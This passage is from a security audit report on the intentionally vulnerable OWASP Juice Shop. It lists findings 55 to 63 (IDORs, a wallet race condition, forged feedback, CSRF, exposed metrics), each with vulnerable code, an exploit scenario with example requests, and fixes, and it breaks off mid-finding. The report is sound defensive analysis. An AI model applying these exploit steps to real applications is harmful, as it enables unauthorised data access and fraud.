Validate and act on the SAME value: use a single canonical BasketId (e.g. basketIds[basketIds.length-1]) for both the ownership check on line 34 and the build on line 39, or reject requests containing duplicate BasketId keys.

**Exploitability:** HTTP parameter pollution writes basket item to victim basket (check on first BasketId, write on last). Scoped integrity. CVSS 4.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — HTTP parameter pollution: ownership check reads basketIds[0] but persistence uses basketIds[last], letting an authenticated user write items into a victim's basket; no upstream control closes the gap.

I have confirmed the finding. Let me summarize my analysis.

**A. What the code does:** `addBasketItem()` (line 16-53) parses the raw body via `parseJsonCustom` (clarinet streaming parser, lib/utils.ts:193), which preserves *every* key/value pair in order — so duplicate `BasketId` keys produce multiple array entries. The ownership guard (line 34) checks `basketIds[0]` (first occurrence) against the session's `user.bid`, but the persisted `basketItem` (line 39) uses `basketIds[basketIds.length - 1]` (last occurrence). First/last mismatch is exactly the exploitable gap.

**B. Call chain to entry point:** server.ts:393 registers `app.post('/api/BasketItems', appendUserId(), quantityCheckBeforeBasketItemAddition(), addBasketItem())`. This is a network-reachable HTTP POST. Confirmed external entry point.

**C. Defenses probed:**
- `/api/BasketItems` is gated by `security.isAuthorized()` (server.ts:324) → requires *any* authenticated user (PR:L), not the same as ownership of target basket.
- `appendUserId()` only sets `req.body.UserId` from the JWT — it does not constrain `BasketId`.
- `quantityCheckBeforeBasketItemAddition()` only validates ProductId/quantity stock limits — no ownership enforcement.
- The only ownership control is the line-34 check, which inspects `basketIds[0]` while the write uses the last element → bypassed by parameter pollution.

**D. Edge cases:** clarinet genuinely appends each duplicate key (does not overwrite), so a body with `{"BasketId":<own>, ..., "BasketId":<victim>}` passes the check with the attacker's own bid first and writes to the victim's bid last. Line 42 (`basketManipulateChallenge` solveIf) explicitly fires when `user.bid != basketItem.BasketId`, confirming the mismatch is intended and observable.

This is the deliberately-planted **basketManipulateChallenge**. It is a real, reachable authorization-bypass logic flaw: an authenticated attacker injects items into another user's basket (cross-user integrity impact). No read of victim data (C:N), constrained to adding basket items (I:L), no availability impact.

### 56. [MEDIUM] Any authenticated user can read every user record
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `server.ts:329-334`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
Line 329 registers `app.get('/api/Users', security.isAuthorized())` and lines 330-334 register `/api/Users/:id` with `.get(security.isAuthorized())`. The actual data is served by the finale auto-CRUD resource created at lines 462-468 with `endpoints: ['/api/Users','/api/Users/:id']` and `exclude: ['password','totpSecret']`. isAuthorized only verifies that a valid JWT/session exists; nowhere is the requested :id compared to the caller's own user id, nor is the list query scoped to the caller. Therefore the :id path var (attacker-controlled) reaches the ORM findByPk/findAll with no ownership filter.

#### Impact
The /api/Users collection and /api/Users/:id item endpoints are protected only by security.isAuthorized() (a login check). Once any low-privilege account is logged in, it can enumerate and read every other user's record (id, email, role, profile fields) exposed by the auto-generated finale resource, leaking the full customer base.

#### Exploit scenario
Attacker registers/logs in as an ordinary customer, then sends `GET /api/Users/2` (or simply `GET /api/Users`) with their Bearer token. The server returns the targeted/other users' records (email, role, etc.) because only login—not ownership—is enforced.

#### Preconditions
- Attacker holds any valid (low-privilege) session token

```
app.get('/api/Users', security.isAuthorized())
  app.route('/api/Users/:id')
    .get(security.isAuthorized())
    .put(security.denyAll())
    .delete(security.denyAll())
```

#### How to fix
Authorization, not just authentication, must gate per-record access. For /api/Users/:id reject when req.params.id !== caller.id (or require admin), and for the collection scope the finale list to the caller or restrict to an admin role; add an ownership/role check in a before-hook on the User resource.

**Exploitability:** Any authenticated user can read every user record (password/totpSecret excluded). Bulk but low-sensitivity. CVSS 4.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — `/api/Users` and `/api/Users/:id` GET are gated only by JWT validity (isAuthorized = bare expressJwt), with no ownership/scope filter; any self-registered user reads every user record (sans password/totpSecret).

The finding is confirmed. Let me verify the key facts:

**A. Code at cited lines (329-334):** Matches the scanner's snippet exactly. `/api/Users` GET and `/api/Users/:id` GET are guarded only by `security.isAuthorized()`. PUT/DELETE are `denyAll()`.

**B. What `isAuthorized` does:** Line 48 of `lib/insecurity.ts`: `export const isAuthorized = () => expressJwt(({ secret: [REDACTED-SECRET] }) as any)` — it only validates that a JWT exists/verifies. No ownership comparison, no `appendUserId`.

**C. Looking for a defence:**
- Compare to other endpoints in the same file: `/api/Cards`, `/api/Addresss`, `/rest/basket` all use `security.appendUserId()` to scope the query to the caller. `/api/Users` notably does **not** — no ownership middleware, no query scoping.
- The data is served by the finale auto-CRUD resource (lines 462-468) with `excludeAttributes: ['password','totpSecret']`. So password and TOTP secret are stripped, but email, role, deluxeToken, etc. are returned.
- Registration (`POST /api/Users`) is open/unauthenticated, so any attacker can self-provision a low-privilege account and obtain a valid token.

**External entry point:** Yes — network-reachable REST endpoint, reachable by any authenticated (self-registerable) user. The `:id` path var flows directly to finale's `findByPk` with no ownership filter; `GET /api/Users` returns the full list.

**Verdict reasoning:** This is a genuine Broken Object-Level Authorization / IDOR (and broken function-level auth on the list endpoint). External entry point reached, no upstream control closes the path, real confidentiality impact. The scanner read the code correctly. (Yes, this is an intentional Juice Shop challenge, but it is still a true SAST finding.)

**Impact calibration:** `password` and `totpSecret` are excluded, so leaked data is limited PII (email, role, etc.) rather than credentials → C:L. No write path (PUT/DELETE are `denyAll`) → I:N. No availability impact. Requires a valid low-priv token → PR:L. Same component → S:U.

### 57. [MEDIUM] TOCTOU race on wallet balance during checkout
**Class:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
**CWE:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition - https://cwe.mitre.org/data/definitions/367.html
**File:** `routes/order.ts:137-146`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
The checkout handler reads the wallet with WalletModel.findOne (line 139), tests `wallet.balance >= totalPrice` (line 140), and only then calls WalletModel.decrement (line 141). These are two separate, non-atomic database operations with no row lock or transaction. The request that triggers placeOrder originates from the authenticated checkout call (req.params.id basket plus req.body.orderDetails.paymentId === 'wallet' and req.body.UserId). If the same user submits N checkout requests for paying baskets in parallel, each Node request handler interleaves: all N findOne calls observe the original balance, all N comparisons succeed, and all N decrements execute, so the wallet is debited N×totalPrice from a balance that only covered one order. The check (line 140) and the mutation (line 141) form a classic check-then-act window that a second concurrent request can slip through.

#### Impact
An authenticated user can spend more digital-wallet funds than they hold by firing concurrent checkout requests. Both requests read the same balance, both pass the `balance >= totalPrice` guard, and both decrement, driving the wallet negative and letting the attacker obtain goods worth more than their funds.

#### Exploit scenario
Attacker with a wallet balance of 100¤ and a basket costing 90¤ scripts 5 simultaneous POSTs to the basket checkout endpoint with paymentId='wallet'. All 5 read balance=100, all pass `100 >= 90`, all decrement 90, producing balance = -350 while 5 orders are confirmed. The attacker receives 450¤ of goods backed by 100¤.

#### Preconditions
- Valid authenticated session (any low-privilege user)
- A wallet with some balance and one or more paying baskets
- Ability to issue concurrent HTTP requests

```
const wallet = await WalletModel.findOne({ where: { UserId: req.body.UserId } })
if ((wallet != null) && wallet.balance >= totalPrice) {
  await WalletModel.decrement({ balance: totalPrice }, { where: { UserId: req.body.UserId } })
} else {
  next(new Error('Insufficient wallet balance.'))
  return
}
```

#### How to fix
The balance check and debit must be atomic. In routes/order.ts wrap the findOne/compare/decrement in a single SQL transaction with a row-level lock (Sequelize transaction with `lock: LOCK.UPDATE`), or perform a conditional decrement (`UPDATE wallet SET balance=balance-:total WHERE UserId=:id AND balance>=:total`) and treat 0 affected rows as insufficient funds, instead of the separate read-then-write at lines 139-141.

**Exploitability:** TOCTOU on wallet balance allows over-spend via parallel checkouts; AC:H, financial integrity. CVSS 6.0 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Non-atomic check-then-act on wallet balance reachable from an authenticated network checkout endpoint with no transaction, lock, rate limit, or negative-balance constraint; concurrent requests double-spend the wallet.

I've confirmed the relevant facts. Let me assess:

**A. What the code does:** Confirmed exactly as reported. Line 139 `findOne` reads the wallet, line 140 tests `wallet.balance >= totalPrice` in JS, line 141 `WalletModel.decrement` issues a separate UPDATE. No transaction, no `SELECT ... FOR UPDATE`, no row lock wrapping the read+check+write.

**B. Call chain to external entry point:** `placeOrder()` → mounted at `app.post('/rest/basket/:id/checkout', placeOrder())` (server.ts:557). This is a network HTTP endpoint. Gated by `app.use('/rest/basket', security.isAuthorized(), security.appendUserId())` (server.ts:322), so it requires a valid JWT (any low-privilege authenticated user). `appendUserId` sets `req.body.UserId` from the caller's own token — so an attacker races against *their own* wallet, which is exactly the double-spend scenario. External, lower-privileged entry point reached.

**C. Searching for a defence:**
- No transaction anywhere in the handler.
- `decrement` is individually atomic at the SQL layer, but the **gate** (the `>=` comparison) is computed from a stale prior read — the classic check-then-act window. Node's async `await` between findOne and decrement yields the event loop, so N concurrent requests all read the same balance, all pass the check, all decrement.
- Wallet model (wallet.ts) has only `isInt` validation on `balance` — no `min: 0`, no DB constraint preventing negative balances.
- No rate limit on the checkout route (only `/rest/user/reset-password` has `rateLimit`).
- Not test/dead code — it's the live checkout path.

**D. No defence found to probe.** The path is fully open.

**Impact:** Financial integrity violation — an attacker extracts confirmed orders/goods exceeding their wallet balance, driving the balance arbitrarily negative. Confidentiality and availability unaffected; integrity is high. This is a genuine TOCTOU on a security/business-critical asset, not a planted-challenge mismatch or a mis-read sink.

The one mitigating factor for scoring: winning the race requires concurrent timing (race condition) → AC:H per CVSS guidance.

### 58. [MEDIUM] Lossy email obfuscation collides distinct users' order histories
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `routes/orderHistory.ts:12-15`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
The authenticated user's email (derived from the Bearer token at line 10) is transformed by replacing every vowel with '*' (line 13) and then used as the sole query key against ordersCollection (line 14). The transform is many-to-one: e.g. 'a@bob.com', 'e@bob.com', 'i@bob.com' all collapse to '*@b*b.c*m'. Because orders are stored under the same obfuscated key, find({email: updatedEmail}) returns every order whose owner's email maps to the identical masked string. The ownership decision is therefore made on a lossy projection of identity rather than the unique user id (loggedInUser.data.id is checked for existence on line 11 but never used in the query), so two users sharing a collision class see each other's full order history.

#### Impact
An authenticated user can retrieve another user's order history whenever the two account emails reduce to the same vowel-masked string. This exposes order contents (products purchased, totals, delivery status, addresses) of unrelated customers, a cross-account information leak.

#### Exploit scenario
Attacker registers/uses an account whose email differs from a target only in vowels (or by adding/removing vowels that mask identically), logs in to obtain a Bearer token, and calls GET on the order-history endpoint. The server masks the attacker's email to the shared key and returns all orders—including the victim's—because both emails map to the same '*'-substituted string.

#### Preconditions
- Attacker holds any valid authenticated session (low-privilege user)
- A victim account exists whose email obfuscates to the same vowel-masked string as an account the attacker controls

```
const email = loggedInUser.data.email
const updatedEmail = email.replace(/[aeiou]/gi, '*')
const order = await ordersCollection.find({ email: updatedEmail })
res.status(200).json({ status: 'success', data: order })
```

#### How to fix
Scope order ownership to the unique, non-lossy identity. Query by loggedInUser.data.id (already validated on line 11) or store/match orders by an exact, collision-free identifier rather than the vowel-masked email at lines 13-14.

**Exploitability:** Lossy vowel-masking key collides users' order histories; cross-tenant leak limited to collision classes. CVSS 6.5 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — masked email is the sole, lossy query key; unique user id checked but never used, so colliding-email users read each other's full order history via an authenticated network endpoint with no neutralizing control.

**Investigation**

**A. Cited code (verified):** `routes/orderHistory.ts:11-15` — handler masks the logged-in user's email with `email.replace(/[aeiou]/gi, '*')` and queries `ordersCollection.find({ email: updatedEmail })`. The unique `loggedInUser.data.id` is checked for *existence* on line 11 but never used in the query. Snippet matches the scanner's claim exactly.

**B. Call chain / entry point:** Registered at `server.ts:576` as `app.get('/rest/order-history', orderHistory())` — a network endpoint. No route-level middleware, but the handler itself resolves the user from the Bearer token (`security.authenticatedUsers.get(...)`); unauthenticated requests fall into the `else` branch and error out. So it is reachable by **any authenticated low-priv user**. (Contrast: `allOrders`/`toggleDeliveryStatus` are gated by `isAccounting()`; `orderHistory` is not.)

**C. Storage side — does the collision actually exist?** Confirmed orders are *stored* with the same lossy transform:
- `routes/order.ts:161` — `email: (email ? email.replace(/[aeiou]/gi, '*') : undefined)`
- `data/datacreator.ts:687,696` — seeded orders likewise stored masked.

So both write and read use the identical many-to-one masking. The query key is a lossy projection of identity, and the unique user id is never applied as a filter. Two users whose emails share the same consonant skeleton / length (e.g. `a@bob.com`, `e@bob.com` → `*@b*b.c*m`) genuinely collide.

**D. Probing defenses:** No allow-list, no secondary id filter, no scoping by UserId in the Mongo query. Juice Shop permits arbitrary email registration, so an attacker can deliberately register an email that masks identically to a known victim, authenticate, and call the endpoint to retrieve the victim's full order history (products, prices, addressId, paymentId). No control closes the path.

This is a real cross-user data-exposure logic flaw with an authenticated network entry point and no neutralizing control. (Intentional-vuln context doesn't change the verdict — it's a confirmed, exploitable IDOR-style ownership flaw.)

**CVSS rationale:** Network (AV:N); attacker can craft a colliding email at will, low complexity (AC:L); requires any authenticated session (PR:L); no user interaction (UI:N); same component (S:U); discloses another user's order history — confidentiality only (C:H/I:N/A:N).

### 59. [MEDIUM] Metrics endpoint exposes sensitive aggregate business data without authorization
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `routes/metrics.ts:63-72`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
serveMetrics writes register.metrics() (which includes the gauges built in observeMetrics: wallet_balance_total, users_registered_total, orders_placed_total, etc.) to the response with no identity or role check inside the handler. Authorization depends entirely on the middleware chosen at route registration; the exposedMetricsChallenge_2 variant registers app.get('/metrics', metrics.serveMetrics()) with no guard, exposing all of this to unauthenticated callers.

#### Impact
serveMetrics emits aggregate business intelligence — total registered users (standard/deluxe), total wallet balance across all users, order/review/feedback/complaint counts — to any caller of /metrics. The handler performs no per-request authorization, so when the route is registered without an admin guard (the vulnerable variant), an anonymous client can read confidential operational data.

#### Exploit scenario
An unauthenticated attacker issues GET /metrics and parses the Prometheus output to read juice_shop_wallet_balance_total and juice_shop_users_registered_total, disclosing aggregate financial and user-base figures.

#### Preconditions
- route registered without security.isAdmin()/denyAll() (vulnerable deployment variant)

```
export function serveMetrics () {
  return async (req, res, next) => {
    challengeUtils.solveIf(...)
    res.set('Content-Type', register.contentType)
    res.end(await register.metrics())
  }
}
```

#### How to fix
Authorization must be enforced for the metrics endpoint. Register /metrics with security.isAdmin() (as in exposedMetricsChallenge_3_correct.ts:4) and/or add a role check inside serveMetrics before calling register.metrics().

**Exploitability:** Unauthenticated /metrics exposes aggregate business gauges; low-sensitivity info leak. CVSS 5.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — /metrics is registered unauthenticated at server.ts:662 and serveMetrics writes wallet/user/order aggregates to any anonymous caller; no auth gate anywhere on the path

**Investigation**

**A. The sink (routes/metrics.ts:63-72):** `serveMetrics()` returns a handler that performs no identity/role check. It sets the Prometheus content-type and writes `register.metrics()`. The registry is populated by `observeMetrics()` (lines 75-207), which builds gauges including `wallet_balance_total` (sum of all wallet balances, line 131-134/194), `users_registered_total` (line 126-129/193), `orders_placed_total` (line 115-118/189), customer/deluxe counts, feedback/complaint counts, etc. So the response genuinely discloses aggregate financial and user-base figures. Scanner's description of the sink is accurate.

**B. Call chain to entry point:** The real production registration is `server.ts:662 → app.get('/metrics', metrics.serveMetrics())` — **no guard middleware**. This is the live Express app, not merely the `exposedMetricsChallenge_2` codefix variant the scanner cited (the codefix files under `data/static/codefixes/` are out-of-scope challenge artifacts). The actual shipped server is itself unguarded. `app.get` with no auth middleware → reachable by any unauthenticated network client. External entry point confirmed.

**C. Search for defences:** 
- No `security.isAdmin()` / `denyAll()` on line 662 (contrast with the *correct* codefix `exposedMetricsChallenge_3_correct.ts` which adds `security.isAdmin()`).
- The only conditional inside the handler is `solveIf` for challenge-tracking (user-agent filtering for scoring), which does **not** gate the response — `res.end(await register.metrics())` runs unconditionally.
- No upstream global auth middleware applies to `/metrics` (it is registered after the model-init block, alongside public routes).

**D.** No defence exists to probe. The path is fully open.

This is an intentional Juice Shop challenge ("Exposed Metrics"), but per scope rules that does not make it out-of-scope — it is a real, demonstrable unauthenticated information disclosure with a concrete data-exposure path, not a theoretical best-practice gap.

**Impact calibration:** Discloses *aggregate* business/financial counts only (no per-user PII, no records). Confidentiality = Limited; no integrity or availability impact. Unauthenticated, network, no user interaction, same component (the app's own data).

### 60. [MEDIUM] Feedback UserId is mass-assignable, allowing forged feedback ownership
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `models/feedback.ts:20-30`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
The Feedback model exposes UserId as a plain, writable INTEGER attribute (lines 20, 28-30) with no setter validation, no association binding to the session user, and no exclusion from mass assignment. Feedback records are created through the Sequelize auto-CRUD resource registered in server.ts (finale.resource for /api/Feedbacks), which binds the JSON request body directly into Feedback.create(). Because UserId is part of the writable attribute set, an attacker simply includes "UserId": <victimId> in the POST body. Nowhere between the request and persistence is the feedback's UserId verified against the authenticated principal's id, so horizontal manipulation of the owning user is possible.

#### Impact
Any caller of the auto-generated /api/Feedbacks CRUD endpoint can set the UserId attribute to any user's id, attributing their feedback to an arbitrary victim (or detaching it by passing null). There is no check that the supplied UserId matches the authenticated caller, breaking author integrity and enabling the 'Forged Feedback' abuse.

#### Exploit scenario
An attacker sends POST /api/Feedbacks with body {"comment":"...","rating":1,"UserId":1}. The auto-CRUD layer passes UserId straight into the model, which stores the feedback as belonging to user 1 (e.g., the admin). The feedback is now displayed/attributed to the victim, and the attacker has forged content as another identity.

#### Preconditions
- The /api/Feedbacks auto-CRUD route is exposed (default in this app)
- Attacker can send a JSON POST body (no per-record ownership enforcement)

```
  declare UserId: number | null
  ...
      UserId: {
        type: DataTypes.INTEGER
      },
```

#### How to fix
UserId must be derived server-side from the authenticated session, not from the request body. In this model, remove UserId from client-writable attributes (or add a setter/hook that overwrites it with the session user id) and have the route inject req.user.id; never trust a client-supplied UserId.

**Exploitability:** Feedback UserId mass-assignable → forged ownership; low integrity. CVSS 5.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — UserId is mass-assignable on the unauthenticated finale POST /api/Feedbacks route; no appendUserId override and the only middleware merely detects (not blocks) the forgery

I have confirmed the finding against the actual source.

**A. The sink** — `models/feedback.ts` line 20 declares `UserId: number | null`, and lines 28-30 init it as a plain `DataTypes.INTEGER` with no setter, no `allowNull`, no validation. The `comment` and `rating` fields have custom setters, but `UserId` is wide open.

**B. Call chain** — `POST /api/Feedbacks` is served by the finale auto-CRUD resource (model registered at server.ts:448), which binds the JSON body directly into `Feedback.create()`. External, network-reachable entry point. Notably the POST route has **no** `security.isAuthorized()` gate (only `/api/Feedbacks/:id` and PUT are guarded), so it's reachable even unauthenticated.

**C. Defenses — searched, none close the path:**
- No `security.appendUserId()` on the POST route (compare Cards/Addresss/BasketItems at lines 392-418, which DO inject the session UserId). Its absence is the whole bug.
- The only POST middlewares are `forgedFeedbackChallenge`, `verifyCaptcha`, `captchaBypassChallenge`.
- `verify.forgedFeedbackChallenge` (routes/verify.ts:25-32) literally **detects** the attack — `req.body.UserId && req.body.UserId != userId` — to mark a challenge solved. It calls `next()` regardless; it does not block or overwrite UserId.
- The captcha is an anti-automation control, not an ownership control, and a sibling middleware (`captchaBypassChallenge`) exists precisely because it's bypassable.

**D.** This is the intentional "Forged Feedback" challenge in Juice Shop — a confirmed, externally reachable mass-assignment / horizontal IDOR with no upstream control on UserId. Scanner read the code correctly.

Impact is integrity only: an attacker forges feedback attributed to another user (e.g. admin). No confidentiality breach, no auth bypass, no availability impact. PR:N because the POST endpoint has no auth gate.

### 61. [MEDIUM] Recycle item fetch lacks ownership/tenant authorization (IDOR)
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `routes/recycles.ts:8-18`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
getRecycleItem loads a RecycleModel row using the attacker-supplied path parameter (req.params.id) as the sole filter. There is no comparison between the record's owner (UserId) and the authenticated caller's identity, and no tenant scoping. Because the id is attacker-varied, an actor can enumerate ids 1,2,3... and retrieve every recycle record in the table, each belonging to other users.

#### Impact
Any caller can read another user's recycling request record simply by supplying its numeric id. Recycle records contain user-supplied address/quantity/scheduling data, so this leaks one user's data to another with no authorization check.

#### Exploit scenario
An authenticated (or even unauthenticated, depending on route guard) user requests GET /api/Recycles/2 (or the mapped route for getRecycleItem) and receives the full recycle record created by another user, including their address and pickup details. Iterating the id yields the entire recycling dataset.

#### Preconditions
- Route bound to getRecycleItem is reachable
- Records belonging to other users exist

```
RecycleModel.findAll({
    where: {
      id: JSON.parse(req.params.id)
    }
  }).then((Recycle) => {
    return res.send(utils.queryResultToJson(Recycle))
```

#### How to fix
After findAll, verify the returned record's UserId equals the authenticated caller's id (or restrict the query with where:{UserId: req.user.id}); reject or 404 otherwise. Enforce this at routes/recycles.ts:9-13.

**Exploitability:** Recycle item IDOR enumerable by id, unauth; low-sensitivity data. CVSS 5.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Unauthenticated GET /api/Recycles/:id loads any record solely by attacker-enumerable id with no ownership/tenant check; real IDOR, though leaked data is metadata/FKs (UserId, AddressId, date), not literal address text as claimed.

I have enough to render a verdict. Let me confirm what I found:

**A. The sink (recycles.ts:8-18):** `getRecycleItem` calls `RecycleModel.findAll({ where: { id: JSON.parse(req.params.id) } })` and returns the row(s) via `res.send(utils.queryResultToJson(Recycle))`. The only filter is the attacker-supplied `:id`. No `UserId` comparison, no tenant scoping. Confirmed.

**B. Call chain / entry point (server.ts:354):** `app.get('/api/Recycles/:id', recycles.getRecycleItem())` — bound directly to the handler with **no preceding middleware**. Sibling routes are explicitly gated (`POST` → `isAuthorized()`, `PUT`/`DELETE` → `denyAll()`, `GET /api/Recycles` → `blockRecycleItems()`), but the `GET /:id` route is deliberately left ungated. There is no global `/api` auth gate (auth is applied per-route; `verify.jwtChallenges()` at line 320 is challenge-detection, not enforcement). So the route is network-reachable and **unauthenticated**. External entry point confirmed.

**C. Hunt for defences:** None. No allow-list, no auth/authz, no ownership filter. `id` is autoincrement INTEGER → trivially enumerable (1,2,3…). The route is real production wiring, not test/dead code.

**D. Probe:** The only nuance is impact scope. The `Recycle` model (models/recycle.ts) stores `id, UserId, AddressId, quantity, isPickup, date` — i.e. *foreign-key references* (UserId, AddressId) and metadata, **not** the literal street address text the scanner claims ("address and pickup details"). So this is broken access control / IDOR exposing other users' recycle metadata and the linkage of user→address→pickup date, but not full PII directly in this row. Still a genuine cross-user data exposure with no defence in path.

The scanner's core claim (load-by-id with no ownership/tenant check, attacker-enumerable, unauthenticated) is accurate; only the magnitude of leaked data is slightly overstated. This is a real, reachable broken-access-control flaw.

Impact: limited confidentiality (IDs + metadata of other users' records), no integrity/availability impact, no privileges required.

### 62. [MEDIUM] Profile update endpoint lacks CSRF protection
**Class:** CWE-352: Cross-Site Request Forgery (CSRF)
**CWE:** CWE-352: Cross-Site Request Forgery (CSRF) - https://cwe.mitre.org/data/definitions/352.html
**File:** `routes/updateUserProfile.ts:11-39`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
updateUserProfile() authenticates the caller purely from the cookie token (req.cookies.token, line 13) and then mutates the user record via user.update({ username: req.body.username }) (line 33). There is no CSRF token validation, no SameSite enforcement, and the code even rewards (solves the csrfChallenge) requests whose Origin/Referer is the external htmledit.squarefree.com editor while username changed (lines 27-31), confirming the route is intentionally reachable cross-site. Any HTML page the victim loads can auto-submit a request to this route; the browser attaches the session cookie, the server resolves the logged-in user and overwrites their username with attacker-supplied content.

#### Impact
A logged-in victim who visits an attacker-controlled page can have their profile username silently changed via a forged cross-origin request, because the endpoint authorizes solely on the ambient session cookie with no anti-CSRF token or origin enforcement.

#### Exploit scenario
Attacker hosts a page with a hidden auto-submitting form (or fetch with credentials) targeting POST /profile carrying username=<attacker value>. When an authenticated Juice Shop user opens that page, their browser sends the cookie token, the server updates the victim's username (line 33), and the attacker has rewritten the victim's profile—and the stored username later renders into the profile page, enabling stored XSS as a follow-on.

#### Preconditions
- Victim has an active authenticated session (valid token cookie)
- Victim is lured to an attacker-controlled web page

```
const loggedInUser = security.authenticatedUsers.get(req.cookies.token)
...
const savedUser = await user.update({ username: req.body.username })
```

#### How to fix
Require a verified anti-CSRF token (synchronizer token or double-submit cookie) and enforce SameSite=strict on the session cookie before processing the update at routes/updateUserProfile.ts:33; reject requests whose Origin/Referer is not the application's own host instead of merely scoring a challenge.

**Exploitability:** Profile update lacks CSRF/SameSite; cross-site username overwrite with victim interaction, sets up stored XSS. CVSS 4.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — POST /profile is state-changing, cookie-authenticated, and has no CSRF token / SameSite / Origin enforcement; reachable via cross-site auto-submit, overwriting the victim's username.

**Investigation**

**A. Cited code (routes/updateUserProfile.ts:11-39)** — Confirmed. The handler authenticates solely from `req.cookies.token` (line 13), loads the user by PK, then `user.update({ username: req.body.username })` (line 33). Lines 27-31 explicitly solve `csrfChallenge` when the request's `Origin`/`Referer` is `htmledit.squarefree.com` and the username changed — confirming the route is intentionally designed to be exercised cross-site.

**B. Entry point** — `server.ts:612` registers `app.post('/profile', updateUserProfile())` with no preceding auth/CSRF middleware on that line. Reachable over the network by any browser carrying the session cookie. External entry point: ✅.

**C. Defences — searched, none found:**
- No CSRF token middleware (`csurf`) anywhere; only grep hits are the challenge itself.
- `res.cookie('token', ...)` (line 37, and insecurity.ts:187) sets the cookie with **no `sameSite`, no `httpOnly`, no `secure`** flags — browser will auto-attach it on cross-site POST.
- CORS is `app.use(cors())` (server.ts:174) with permissive defaults, but CORS is irrelevant to a simple form-POST CSRF anyway.
- No Origin/Referer enforcement — the only Origin check (lines 28-31) *rewards* the cross-site request rather than blocking it.

**D. Edge cases** — No allow-list, no token comparison, no double-submit cookie. A hidden auto-submitting `<form method=POST action=/profile>` with `username=...` fully works. Confirmed reachable; no gate closes the path.

**Impact** — An authenticated victim visiting an attacker page has their username silently overwritten (integrity). The username is later eval'd/rendered in `userProfile.ts` (line 59, SSTI/stored-XSS sink), so this is also a stepping stone, but the CSRF itself directly tampers profile integrity. This is an intentional Juice Shop challenge, but the finding's class (CSRF / missing anti-CSRF + SameSite) is accurate and not in any out-of-scope bucket — it is a real, externally-reachable, undefended state-changing request.

The scanner read the code correctly: right file, right sink, right class, real cross-site reachability.

### 63. [MEDIUM] Premium paywalled content served without authorization check
**Class:** CWE-862: Missing Authorization
**CWE:** CWE-862: Missing Authorization - https://cwe.mitre.org/data/definitions/862.html
**File:** `routes/premiumReward.ts:8-13`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
